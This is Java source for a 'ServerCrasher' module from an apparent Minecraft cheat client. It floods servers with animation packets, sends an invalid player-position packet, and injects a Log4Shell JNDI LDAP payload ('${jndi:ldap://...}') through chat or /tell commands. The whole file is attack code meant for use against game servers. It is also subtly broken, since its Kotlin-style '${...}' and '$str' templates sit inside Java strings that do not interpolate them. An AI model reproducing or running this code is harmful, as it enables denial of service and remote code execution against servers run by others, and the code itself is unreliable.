package it.fktcod.ktykshrk.module.mods;

import it.fktcod.ktykshrk.Core;
import it.fktcod.ktykshrk.module.HackCategory;
import it.fktcod.ktykshrk.module.Module;
import it.fktcod.ktykshrk.value.Mode;
import it.fktcod.ktykshrk.value.ModeValue;
import it.fktcod.ktykshrk.value.Value;
import it.fktcod.ktykshrk.wrappers.Wrapper;
import net.minecraft.network.play.client.C01PacketChatMessage;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C0APacketAnimation;
import net.minecraftforge.fml.common.gameevent.TickEvent;
import net.minecraftforge.fml.common.gameevent.TickEvent.ClientTickEvent;

public class ServerCrasher extends Module {
	ModeValue modeValue;
	ModeValue log4jModeValue;

	public ServerCrasher() {
		super("ServerCrasher", HackCategory.ANOTHER);
		this.modeValue = new ModeValue("Mode",
				new Mode[] { new Mode("Swing", true), new Mode("AAC5", false), new Mode("Log4j", false) });
		this.log4jModeValue = new ModeValue("Log4jMode", new Mode("Chat", true), new Mode("Command", false),
				new Mode("Basic", false));
		addValue(this.modeValue, this.log4jModeValue);
		this.setChinese(Core.Translate_CN[83]);
	}

	@Override
	public void onEnable() {

		if (modeValue.getMode("Log4j").isToggled()) {
			String str = "${jndi:ldap://192.168.${RandomUtils.nextInt(1,253)}.${RandomUtils.nextInt(1,253)}}";
			if (log4jModeValue.getMode("Chat").isToggled()) {
				Wrapper.INSTANCE.sendPacket(
						new C01PacketChatMessage("${RandomUtils.randomString(5)}$str${RandomUtils.randomString(5)}"));

			} else if (log4jModeValue.getMode("Command").isToggled()) {
				Wrapper.INSTANCE.sendPacket(new C01PacketChatMessage("/tell ${RandomUtils.randomString(10)} $str"));
			} else {
				Wrapper.INSTANCE.sendPacket(new C01PacketChatMessage(str));
			}

		}
		super.onEnable();
	}


	@Override
	public void onClientTick(ClientTickEvent event) {
		if (this.modeValue.getMode("Swing").isToggled()) {
			Wrapper.INSTANCE.sendPacket(new C0APacketAnimation());
		} else if (this.modeValue.getMode("AAC5").isToggled()) {
			Wrapper.INSTANCE.sendPacket(new C03PacketPlayer.C04PacketPlayerPosition(1.7E301D, -999.0D, 0.0D, true));
		}
		super.onClientTick(event);
	}

}
